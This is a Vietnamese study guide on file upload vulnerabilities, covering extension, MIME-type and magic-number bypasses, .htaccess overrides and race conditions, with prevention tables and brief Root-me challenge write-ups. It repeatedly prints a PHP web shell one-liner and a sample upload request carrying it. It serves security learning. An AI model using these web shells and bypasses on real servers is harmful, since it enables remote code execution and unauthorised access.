# File upload vulnerabilities
- File upload vulnerabilities là khi máy chủ web cho phép người dùng tải tệp lên hệ thống tệp của nó mà không xác thực đầy đủ những thứ như tên, loại, nội dung hoặc kích thước của chúng. Việc không thực thi đúng cách các hạn chế đối với những hạn chế này có thể có nghĩa là ngay cả chức năng tải lên hình ảnh cơ bản cũng có thể được sử dụng để tải lên các tệp tùy ý và có khả năng gây nguy hiểm. Điều này thậm chí có thể bao gồm các tệp tập lệnh phía máy chủ cho phép thực thi mã từ xa.
- Trong một số trường hợp, bản thân hành động tải tệp lên đã đủ gây ra thiệt hại. Các cuộc tấn công khác có thể liên quan đến yêu cầu HTTP tiếp theo đối với tệp, thường là để kích hoạt quá trình thực thi tệp của máy chủ.
- File upload vulnerabilities thường phụ thuộc vào hai yếu tố chính:
    - Web không xác thực về kích thước, loại, nội dung, v.v.
    - Một số rule được đặt ra nhưng lại có thể bị by pass.
- Việc có lỗ hổng file upload có thể để lại 1 số hậu quả nghiêm trọng sau:
    - File gửi lên có thể thực thi từ đó bị lấy web shell.
    - Ghi đè file llamf mất dữ liệu.
    - Dos bằng cách load file dung lượng lớn.

## Exploiting 
### File uploads không bị hạn chế
- Với trường hợp này thì web sẽ cho phép ta uploads file mà không kiểm tra kỹ nội dung, loại file hoặc quyền hạn. Từ đó ta có thể lợi dụng lỗ hổng này để tải lên các file độc hại, như web shell, nhằm truy cập từ xa vào máy chủ.
- Với những trường hợp này ta cần xác định form upload file, thường thì sẽ có chỗ cho ta upload file như upload ảnh đại diện,...
- Sử dụng **Burp Suite** ta có thể phân tích cũng như chỉnh sửa **request** cần thiết để by pass.
- Một số cách by pass:
    - **Bypass file extensions checks**
    - **Bypass Content-Type, Magic Number, Compression & Resizing**
    - **Other Tricks to check**
    - **Special extension tricks**
- Ngoài ra còn rất nhiều cách để by pass bạn có thể tham khảo thêm tại [đây](https://book.hacktricks.xyz/pentesting-web/file-upload)

| Phương pháp                     | Mô tả                                                                                       | Ví dụ                                                    |
|---------------------------------|---------------------------------------------------------------------------------------------|----------------------------------------------------------|
| Bypass kiểm tra phần mở rộng     | Đổi tên file để trông giống như một file hợp lệ hoặc dùng phần mở rộng kép                 | `shell.php.jpg`, `shell.php;` hoặc `shell.php5`          |
| Bypass Content-Type              | Sửa Content-Type trong request để trông giống như một loại file hợp lệ                      | Đổi `Content-Type: application/x-php` thành `image/jpeg` |
| Bypass Magic Number              | Thay đổi mã magic number của file để qua mặt kiểm tra                                       | Thêm byte `\xFF\xD8\xFF\xE0` vào đầu file PHP            |
| Bypass nén và thay đổi kích thước | Nén file hoặc chỉnh sửa kích thước để tránh các bộ lọc nội dung                             | Sử dụng file `.zip` hoặc `.tar.gz` chứa mã độc            |
| Sử dụng phần mở rộng đặc biệt     | Dùng phần mở rộng ít phổ biến hoặc thêm dấu đặc biệt để qua mặt kiểm tra phần mở rộng         | `shell.phtml`, `shell.phar`, `shell.asp;.jpg`            |
| Thay đổi tên file                 | Thêm dấu đặc biệt hoặc mã hóa một phần tên file                                             | `shell.php%00.jpg`, `shell.php\0.jpg`                    |
| Sử dụng file nhúng script         | Nhúng mã script trong các định dạng file ít được kiểm tra kỹ                                | Tạo file SVG có chứa JavaScript                           |

### Exploiting flawed validation of file uploads
- Với trường hợp này thì web check không đầy đủ các yếu tố hoặc check không chính xác loại file được upload. Từ đó ta tải lên các file độc hại bằng nhiều phương pháp khác nhau, chẳng hạn như web shell hoặc các loại mã độc khác, giúp kẻ tấn công truy cập trái phép vào hệ thống.

| **Phương Pháp Khai Thác Lỗi Xác Thực Upload**     | **Ví Dụ**                                                                 |
|---------------------------------------------------|---------------------------------------------------------------------------|
| **Thiếu kiểm tra phần mở rộng file**              | Upload `shell.php` thay vì file ảnh nếu hệ thống không giới hạn extension |
| **Kiểm tra MIME-type không chính xác**            | Dùng Burp Suite đổi `Content-Type` của file PHP thành `image/jpeg`       |
| **Chỉ kiểm tra tên file mà không kiểm tra nội dung** | Upload file PHP với tên `image.jpg` nhưng nội dung là mã PHP             |
| **Sử dụng payload nhúng trong file ảnh**          | Nhúng mã PHP vào cuối file `.jpg`, như `<?php system($_GET['cmd']); ?>`  |
| **Chỉ kiểm tra magic number không đầy đủ**        | Thay đổi magic number của file PHP thành JPEG để vượt qua kiểm tra       |
| **Quá trình kiểm tra không đầy đủ cho file nén**  | Upload `shell.zip` chứa file `.php`, sau đó giải nén trên server         |
| **Sử dụng phần mở rộng kép hoặc đặc biệt**        | Đổi tên `shell.php` thành `shell.php.jpg` hoặc dùng `.php5`, `.phtml`    |
| **Không có giới hạn kích thước file hợp lệ**      | Upload file lớn để tạo **DoS** hoặc nhúng mã độc trong file lớn           |
| **Thiếu kiểm tra cho file kịch bản khác**         | Upload shell với phần mở rộng `.jsp`, `.asp` nếu server hỗ trợ           |
| **Chỉ lọc ký tự một phần tên file**               | Upload `shell;.php` để qua mặt bộ lọc nếu server chỉ kiểm tra `.php`     |

- Ngăn chặn việc thực thi file trong các thư mục người dùng có thể truy cập là biện pháp quan trọng nhằm bảo vệ ứng dụng khỏi việc kẻ tấn công lợi dụng các file độc hại để xâm nhập hệ thống. Khi thực hiện đúng cách, các biện pháp này sẽ giúp giảm thiểu rủi ro từ các lỗ hổng upload file và tránh các cuộc tấn công thông qua web shell hoặc các mã độc khác.
- Dưới đây mình có một số phương pháp có thể ngăn chặn việc thực thi file.

| **Phương Pháp Ngăn Chặn Thực Thi File**       | **Mô Tả**                                                                            | **Ví Dụ**                                                                 |
|-----------------------------------------------|--------------------------------------------------------------------------------------|---------------------------------------------------------------------------|
| **Lưu trữ file ngoài thư mục gốc web**        | Đặt các file upload ở thư mục khác bên ngoài thư mục web để không thể truy cập trực tiếp từ trình duyệt. | Upload file vào thư mục `/uploads` nằm ngoài thư mục gốc `/var/www/html` |
| **Cấu hình quyền thực thi trên thư mục**      | Ngăn chặn quyền thực thi trong thư mục upload để các file không thể được thực thi.  | Thiết lập quyền `chmod -x` cho thư mục upload để ngăn thực thi file      |
| **Sử dụng `.htaccess` để chặn thực thi**      | Với server Apache, file `.htaccess` có thể được sử dụng để ngăn các file PHP hoặc script khác được thực thi trong thư mục. | Thêm `php_flag engine off` vào `.htaccess` trong thư mục upload           |
| **Giới hạn loại file được phép upload**       | Chỉ cho phép các loại file không thể thực thi (như `.jpg`, `.png`, `.pdf`).         | Cho phép upload ảnh hoặc tài liệu nhưng không cho phép các script như `.php` |
| **Thiết lập cấu hình web server an toàn**     | Cấu hình server để ngăn chặn thực thi file trong các thư mục cụ thể hoặc chỉ định các thư mục cho phép. | Sử dụng `nginx` với `location` để từ chối thực thi file trong thư mục upload |
| **Sử dụng công cụ quét mã độc và xác thực file** | Kiểm tra file upload để phát hiện mã độc trước khi lưu trữ và ngăn thực thi mã độc. | Sử dụng các công cụ như ClamAV hoặc mod_security để quét file khi upload |
| **Cấu hình máy chủ để trả về file dưới dạng dữ liệu** | Thiết lập server để xử lý các file upload dưới dạng dữ liệu tĩnh thay vì thực thi | Cấu hình Apache để tất cả file trong thư mục upload được xử lý như `text/plain` |
| **Đổi tên file hoặc lưu trữ ở dạng mã hóa**   | Đổi tên file upload thành chuỗi ngẫu nhiên hoặc lưu trữ file dưới dạng mã hóa để giảm khả năng thực thi. | Đổi tên `shell.php` thành `a1b2c3.tmp` khi lưu trữ                         |
| **Sử dụng sandbox hoặc container hóa**        | Cách ly thư mục upload trong một môi trường ảo để ngăn chặn mã độc lan truyền.     | Chạy thư mục upload trong Docker với các quyền hạn chế                     |


## Flawed file type validation (Xác thực loại file không chính xác)

- Một web cho phép ta dùng tải lên file, server có thể kiểm tra header `Content-Type` của file đó để xác định loại file hợp lệ. Tuy nhiên, nếu chỉ kiểm tra header này mà không kiểm tra thực sự nội dung file, kẻ tấn công có thể lợi dụng lỗ hổng này để tải lên các file độc hại có phần mở rộng khác biệt.

### Cách thức bypass:
Kẻ tấn công có thể sửa header `Content-Type` trong request HTTP để thay đổi loại MIME mà server nhận diện. Ví dụ:
- Upload một file `.php` dưới dạng `image/jpeg` để server không nhận diện được nó là PHP script và cho phép tải lên.
- Công cụ như **Burp Suite** có thể giúp thay đổi trực tiếp `Content-Type` khi gửi request.

- Ví dụ như giả sử bạn muốn upload một script PHP có tên `exploit.php`. Bạn có thể gửi request HTTP với `Content-Type` là `image/jpeg` thay vì `application/x-php`.

```plaintext
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=------------------------abcdef123456

------------------------abcdef123456
Content-Disposition: form-data; name="file"; filename="exploit.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------------------------abcdef123456------------------------
```

- Nếu server chỉ kiểm tra Content-Type mà không kiểm tra đúng nội dung file, file PHP này vẫn có thể được upload thành công.

## Preventing file execution in user-accessible directories (Ngăn chặn thực thi file trong thư mục người dùng có thể truy cập)

- Web ngăn không cho các file tải lên thực thi trong thư mục người dùng có thể truy cập được bằng cách giới hạn MIME types được xử lý. Tuy nhiên, nếu cấu hình không cẩn thận, một số file có thể vẫn được thực thi dù không nằm trong thư mục có cấu hình bảo mật.

## Cách thức bypass
- Kẻ tấn công có thể tải file lên thư mục không được bảo vệ chặt chẽ hoặc có thể thực thi file ở một thư mục mà server không kiểm tra kỹ.

## Insufficient blacklisting of dangerous file types (Danh sách chặn file nguy hiểm không đủ mạnh)
- Một cách phổ biến để ngăn chặn việc upload các file độc hại là blacklist các đuôi file nguy hiểm như .php, .exe, .bat. Tuy nhiên, việc blacklist file extension là phương pháp không hiệu quả vì có thể có nhiều đuôi file khác có thể thực thi mã (ví dụ .php5, .shtml).

- Cách thức bypass:
- Kẻ tấn công có thể sử dụng các đuôi file ít phổ biến hoặc thay đổi đuôi file để vượt qua danh sách chặn. Ví dụ:

- Thay đổi .php thành .php5, .phtml hoặc .shtml để file vẫn có thể thực thi.
- Sử dụng các kỹ thuật như exploit.php.jpg hoặc exploit.php; để file vẫn được upload và thực thi.
- Ví dụ cụ thể:
- Giả sử server chặn .php nhưng không chặn .php5, bạn có thể tải lên file exploit.php5 chứa mã độc.

`exploit.php5`
```php
<?php system($_GET['cmd']); ?>
```

## Overriding the server configuration (Ghi đè cấu hình của server)
- Server thường không thực thi các file nếu chưa được cấu hình để làm như vậy. Ví dụ, với Apache, file PHP chỉ được thực thi khi có các chỉ thị như AddType application/x-httpd-php .php trong tệp cấu hình apache2.conf. Tuy nhiên, kẻ tấn công có thể tải lên các file cấu hình như .htaccess hoặc web.config để ghi đè cấu hình của server.

- Cách thức bypass:
- Kẻ tấn công có thể tải lên file .htaccess chứa các chỉ thị để server xử lý file PHP dù server không được cấu hình để thực thi PHP trong thư mục đó.

- Ví dụ cụ thể:
- Giả sử bạn tải lên file .htaccess vào thư mục /uploads/ có nội dung sau:
```htaccess
AddType application/x-httpd-php .php
```
- Điều này có thể khiến server bắt đầu xử lý file PHP trong thư mục /uploads/ dù nó không được cấu hình để làm vậy.

## Obfuscating file extensions (Làm mờ đuôi file)

- Một số server kiểm tra đuôi file để xác định loại MIME và có thể chặn các đuôi file nguy hiểm như .php. Tuy nhiên, kẻ tấn công có thể làm mờ đuôi file để vượt qua kiểm tra này.

- Cách thức bypass:
- Kẻ tấn công có thể thực hiện các kỹ thuật làm mờ (obfuscation) như:

- Sử dụng nhiều đuôi (ví dụ exploit.php.jpg)
- Thêm ký tự trắng (ví dụ exploit.php.)
- Mã hóa URL cho dấu chấm hoặc các ký tự đặc biệt (ví dụ %2E thay cho dấu chấm).
- Ví dụ cụ thể:
- Giả sử server chỉ chấp nhận file .jpg, nhưng bạn có thể tải lên file exploit.php.jpg. Nếu server không kiểm tra kỹ, nó sẽ xử lý file này như một ảnh nhưng thực tế nó là PHP script.

`exploit.php.jpg`
```php
<?php system($_GET['cmd']); ?>
```

## Flawed validation of the file's contents (Xác thực nội dung file không chính xác)
- Giải thích:
- Các server bảo mật tốt sẽ kiểm tra nội dung file để đảm bảo rằng loại MIME thực sự khớp với nội dung của file. Ví dụ, nếu bạn tải lên một file ảnh, server có thể kiểm tra xem file đó có phải thực sự là ảnh hay không, thông qua các byte đặc trưng của định dạng ảnh (ví dụ JPEG bắt đầu bằng FF D8 FF).

- Cách thức bypass:
- Kẻ tấn công có thể tạo ra các file polyglot, nghĩa là file có thể có nhiều định dạng, chẳng hạn như một file ảnh JPEG chứa mã độc trong metadata. Công cụ như ExifTool có thể được sử dụng để tạo các file như vậy.

- Ví dụ cụ thể:
- Kẻ tấn công tạo ra một file JPEG chứa mã PHP trong phần metadata. File này sẽ bắt đầu bằng FF D8 FF (byte đặc trưng của JPEG), nhưng khi đọc metadata, nó chứa mã PHP.

## Exploiting file upload race conditions (Khai thác điều kiện tranh chấp trong upload file)
- Giải thích:
- Trong một số hệ thống, file có thể được tải lên thư mục tạm thời và sau đó được kiểm tra trước khi chuyển đến thư mục chính. Tuy nhiên, nếu không xử lý đúng, kẻ tấn công có thể lợi dụng khoảng thời gian ngắn (race condition) khi file đang được kiểm tra để thực thi mã.

- Cách thức bypass:
- Kẻ tấn công có thể tận dụng khoảng thời gian rất ngắn (khoảng vài mili giây) giữa việc upload file và kiểm tra để thực thi file trước khi nó bị phát hiện.

- Ví dụ cụ thể:
- Kẻ tấn công tải lên một file PHP vào thư mục tạm thời, nhưng trong khoảng thời gian ngắn trước khi file bị kiểm tra, kẻ tấn công có thể truy cập và thực thi file này.

## Root-me
### File upload - Double extensions
- Với chall này ta chỉ cần thay đổi đuôi mở rộng thành `.php.png` là có thể by pass được.
- Đầu tiên mình thử `ls` xem có những file gì.

![image](https://github.com/user-attachments/assets/09ab1444-f736-47dc-baf8-0439b7f0c1f5)
- Ta biết flag nằm ở file `.passwd`. Lúc này thì cần tìm được file và cat ra thôi.
- Thử `../` từng thư mục rồi cat thử thôi.

![image](https://github.com/user-attachments/assets/b36da3d6-62fa-4703-ad53-252d4647c812)

### File upload - MIME type
- Tương tự chall trên tuy nhiên đuôi mở rộng sẽ là `.png.php`
- Sau khi by pass được thì ta tiếp tục check file `.passwd` nằm ở đâu và cat ra.

![image](https://github.com/user-attachments/assets/09193d11-e34c-47bc-bde1-740c1dbd6fc4)


### File upload - Null byte
- Như tên bài thì ta sửa đuôi mở rộng theo null byte.
- Ở đây mình dùng `.php%00.png` send request và thu flag.

![image](https://github.com/user-attachments/assets/3c01c9b1-2ed4-4eaa-bb1c-3f50caedb05c)

### File upload - ZIP
- Đây mình up file nên thì sẽ được giải nén.
- Mình thử nén lại xong upload. Tuy nhiên vẫn không thể mở.

![image](https://github.com/user-attachments/assets/fb9e43d2-fbcb-4418-91ff-d8396b56742c)

- Mình làm theo cách trên:)) và có được flag.
